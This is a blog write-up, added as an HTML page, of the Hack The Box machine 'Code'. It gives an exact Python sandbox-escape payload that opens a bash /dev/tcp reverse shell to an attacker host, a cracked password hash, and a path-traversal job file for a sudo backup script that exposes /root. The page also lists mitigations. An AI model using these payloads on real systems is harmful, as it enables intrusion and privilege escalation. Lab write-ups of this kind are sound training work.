@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Code CTF Writeup - 18gi0n's Tech Lair</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .opaque-bg {
+            background-color: rgba(13, 13, 13, 0.6);
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+
+        .content .left-aligned-content {
+            text-align: left !important;
+            max-width: 800px;
+            margin: 0 20px !important;
+            padding: 20px 0 !important;
+        }
+
+        .content .left-aligned-content h1,
+        .content .left-aligned-content h2,
+        .content .left-aligned-content p,
+        .content .left-aligned-content ul,
+        .content .left-aligned-content ol,
+        .content .left-aligned-content li {
+            text-align: left !important;
+        }
+
+        .content .left-aligned-content a {
+            color: #ff9933 !important;
+            text-decoration: underline;
+        }
+
+        .content .left-aligned-content a:hover {
+            color: #ff007a !important;
+            text-shadow: 0 0 5px #ff007a;
+        }
+
+        .content .left-aligned-content img {
+            margin: 20px 0 !important;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .content .left-aligned-content {
+                margin: 0 10px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Nav Bar -->
+    <nav>
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="/about.html">About</a></li>
+            <li><a href="/projects.html">Projects</a></li>
+            <li><a href="/code.html">Code & Tools</a></li>
+            <li><a href="/ctf.html">Write-ups</a></li>
+            <li><a href="/research.html">Research</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="opaque-bg" id="opaqueBg"></div>
+    <div class="content">
+        <div class="left-aligned-content">
+            <h1>Code CTF Writeup - Hack The Box</h1>
+            <img src="/assets/images/ctf/code/codethumbnail.png" alt="Code Cover">
+            <h2>1. Box Overview</h2>
+            <p>
+                Code from Hack The Box was a challenging yet rewarding easy-rated Linux machine that focused on web exploitation, sandbox escapes, and creative privilege escalation. The initial foothold involved exploiting a Python code editor running in a sandboxed environment via subclass manipulation to achieve remote code execution. From there, we pivoted to cracking database hashes for user access and exploited a sudo-allowed backup script with path traversal to capture the root flag. It highlighted the importance of thorough enumeration, sandbox bypass techniques, and understanding application logic.
+            </p>
+            <ul>
+                <li><strong>Objective:</strong> Gain initial access, escalate to root, and capture the user and root flags.</li>
+                <li><strong>Skills Developed:</strong> Nmap scanning, web enumeration, Python sandbox escapes, database dumping and hash cracking, sudo exploitation with path traversal.</li>
+                <li><strong>Platform:</strong> Hack The Box</li>
+            </ul>
+
+            <h2>2. Resources Used</h2>
+            <p>Here are the resources that guided me through this challenge:</p>
+            <ul>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">HackTricks: Bypass Python Sandboxes</a><br>
+                    Usage: Provided techniques for escaping Python sandboxes using subclass manipulation and Popen exploitation.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://crackstation.net/">CrackStation</a><br>
+                    Usage: Used for quick lookup of MD5 hashes before resorting to Hashcat.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://www.youtube.com/watch?v=-qGAM0Mt2V0">Ippsec's Code Walkthrough (YouTube)</a><br>
+                    Usage: Referenced for alternative approaches to privilege escalation and backup script exploitation.
+                </li>
+            </ul>
+
+            <h2>3. My Approach to Pwning Code</h2>
+            <p>Here’s a step-by-step breakdown of how I tackled the Code box, from initial reconnaissance to capturing both flags.</p>
+
+            <h3>Starting with Nmap Recon</h3>
+            <p>
+                I kicked off with an Nmap scan using <code>nmap -sV -sC --open -T4 10.10.11.62</code> to identify open ports and services. The scan revealed ports 22 (SSH, OpenSSH 8.2p1) and 5000 (HTTP, Gunicorn 20.0.4), indicating a Linux box with a web application likely running a Python-based service.
+            </p>
+            <img src="/assets/images/ctf/code/1.png" alt="Nmap scan results">
+            <img src="/assets/images/ctf/code/1a.png" alt="curl">
+            <img src="/assets/images/ctf/code/1b.png" alt="Gunicorn">
+
+            <h3>Exploring the Web Server</h3>
+            <p>
+                Visiting <code>http://10.10.11.62:5000/</code> revealed a Python Code Editor, essentially an IDE in the browser. Initial tests showed restrictions: imports like <code>os</code> and file operations were blocked, suggesting a sandboxed environment.
+            </p>
+            <img src="/assets/images/ctf/code/2.png" alt="Python Code Editor">
+            <img src="/assets/images/ctf/code/2a.png" alt="Python Code Editor">
+
+            <h3>Sandbox Escape via Subclass Manipulation</h3>
+            <p>
+                After researching Gunicorn and Python sandboxes, I found a HackTricks guide on bypassing restrictions. I enumerated loaded subclasses with <code>print((()).__class__.__bases__[0].__subclasses__()[300:320])</code> to locate <code>Popen</code> at index 317. Then, I executed a reverse shell: <code>(()).__class__.__bases__[0].__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/10.10.14.62/4447 0>&1'", shell=True, stdout=-1)</code>. This granted a shell as <code>app-production</code>, where I found the user flag.
+            </p>
+            <img src="/assets/images/ctf/code/3b.png" alt="hacktricks">
+            <img src="/assets/images/ctf/code/3a.png" alt="snippet">
+            <img src="/assets/images/ctf/code/3.png" alt="search">
+            <img src="/assets/images/ctf/code/3e.png" alt="payload">
+            <img src="/assets/images/ctf/code/3d.png" alt="User shell">
+
+            <h3>Upgrading the Shell and Initial Enumeration</h3>
+            <p>
+                I upgraded the shell using <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>. Checking <code>/etc/passwd</code> showed users like <code>app-production</code> and <code>martin</code>. I transferred LinPEAS via a Python HTTP server on my machine and ran it, which highlighted CVE-2021-3560, but I pursued other paths.
+            </p>
+            <img src="/assets/images/ctf/code/4.png" alt="Shell upgrade">
+            <img src="/assets/images/ctf/code/4a.png" alt="user enum">
+
+            <h3>Examining the Application and Database</h3>
+            <p>
+                Inspecting <code>app.py</code> revealed a Flask app using SQLAlchemy with a SQLite database at <code>/home/app-production/app/instance/database.db</code>. I dumped the database with <code>sqlite3 database.db</code> and found MD5 hashes for users <code>development</code> and <code>martin</code>.
+            </p>
+            <img src="/assets/images/ctf/code/5.png" alt="app.py exploration">
+            <img src="/assets/images/ctf/code/5b.png" alt="Database dump">
+            <img src="/assets/images/ctf/code/5a.png" alt="Database dump">
+
+            <h3>Cracking Hashes and Pivoting to Martin</h3>
+            <p>
+                I cracked <code>martin's</code> hash (3de6f30c4a09c27fc71932bfc68474be) using Hashcat against rockyou.txt, revealing the password <code>nafeelswordsmaster</code>. With this, I SSH'd in as <code>martin</code>.
+            </p>
+            <img src="/assets/images/ctf/code/6.png" alt="ssh">
+            
+
+            <h3>Privilege Escalation via Backup Script</h3>
+            <p>
+                Running <code>sudo -l</code> showed <code>martin</code> could execute <code>/usr/bin/backy.sh</code> without a password. I created a <code>task.json</code> in <code>/home/martin/backups</code> with path traversal: <code>{"destination": "/home/martin/backups", "multiprocessing": true, "verbose_log": false, "directories_to_archive": ["/home/..././root"]}</code>. Running <code>sudo /usr/bin/backy.sh task.json</code> created a tarball of <code>/root</code>. Extracting it with <code>tar -xvf code_home_.._root_2025_August.tar.bz2</code> and checking <code>root/root.txt</code> gave the root flag.
+            </p>
+            <img src="/assets/images/ctf/code/7.png" alt="sudo -l">
+            <img src="/assets/images/ctf/code/7a.png" alt="backy.sh">
+            <img src="/assets/images/ctf/code/7b.png" alt="t.json">
+            <img src="/assets/images/ctf/code/7c.png" alt="backup">
+            <img src="/assets/images/ctf/code/7e.png" alt="Root flag">
+
+            <h2>4. Lessons Learned and Tips</h2>
+            <p>Here’s what I took away from the Code box:</p>
+            <ul>
+                <li><strong>Tip 1:</strong> When dealing with restricted Python environments, enumerate subclasses to find exploitable objects like Popen for code execution.</li>
+                <li><strong>Tip 2:</strong> Always check application source code for databases or credentials—dumping SQLite can reveal hashes ripe for cracking.</li>
+                <li><strong>Tip 3:</strong> For sudo-allowed scripts, test for path traversal vulnerabilities, especially in backup tools, to access restricted directories.</li>
+                <li><strong>Key Lesson:</strong> Sandbox escapes and path traversal are powerful; combining them with hash cracking makes for effective pivots.</li>
+                <li><strong>Future Goals:</strong> Dive deeper into Python internals and automate more with tools like LinPEAS for faster enumeration.</li>
+            </ul>
+
+            <h2>7. Mitigation Strategies</h2>
+        <p>Here’s how to fix the vulnerabilities we exploited:</p>
+        <ul>
+            <li><strong>Sandbox Escape:</strong> Use a stricter sandbox (e.g., RestrictedPython) to block <code>__subclasses__</code> and <code>Popen</code>. Whitelist safe functions or avoid user code execution.</li>
+            <li><strong>Weak Hashes:</strong> Replace MD5 with bcrypt or Argon2, enforce strong passwords, and restrict database file access to the app user.</li>
+            <li><strong>Path Traversal:</strong> Sanitize paths with <code>os.path.realpath</code>, block <code>..</code>, and confine sudo scripts with AppArmor or chroot.</li>
+        </ul>
+        <p>These changes would block our exploitation techniques, enhancing system security.</p>
+
+            <h2>5. Conclusion</h2>
+            <img src="/assets/images/ctf/code/pwned final.png" alt="Completed badge">
+            <p>
+                Code was an excellent HTB challenge that sharpened my skills in web exploitation, sandbox bypassing, and privilege escalation. From escaping the Python IDE to cracking hashes and exploiting a backup script with path traversal, each phase built on the last. The techniques learned, especially around Python subclasses and sudo abuses, will be invaluable for future boxes. Code was both fun and instructive—on to the next!
+            </p>
+
+            <h2>6. Additional Notes</h2>
+            <ul>
+                <li>The <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">HackTricks Python Sandbox Bypass</a> page was crucial for the initial foothold.</li>
+                <li>For more on similar exploits, check out <a href="https://www.youtube.com/watch?v=-qGAM0Mt2V0">Ippsec's walkthrough</a>, which explores alternative paths like stealing SSH keys.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically set the height of opaque-bg to match the document height
+        function setOpaqueBgHeight() {
+            const opaqueBg = document.getElementById('opaqueBg');
+            const docHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            );
+            opaqueBg.style.height = `${docHeight - 50}px`;
+        }
+
+        window.addEventListener('load', setOpaqueBgHeight);
+        window.addEventListener('resize', setOpaqueBgHeight);
+    </script>
+</body>
+</html>
+```
